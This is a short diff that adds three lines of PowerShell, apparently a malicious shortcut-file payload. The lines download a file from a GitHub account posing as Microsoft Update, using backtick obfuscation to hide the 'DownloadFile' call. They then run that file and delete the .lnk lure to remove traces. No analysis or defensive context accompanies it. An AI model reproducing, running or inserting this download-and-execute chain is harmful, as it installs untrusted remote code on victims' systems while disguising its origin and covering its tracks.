@@ -1,0 +1,3 @@
+(New-Object System.Net.Webclient)."Downloa`dFile"('https://raw.githubusercontent.com/MicrosoftUpdate/Update_181214/master/ec3d2cf6e2edb761e0d5464b89d83.txt','ec3d2cf6e2edb761e0d5464b89d83.txt');
+cmd /c start "" "ec3d2cf6e2edb761e0d5464b89d83.txt"
+Remove-Item ./*txt.lnk
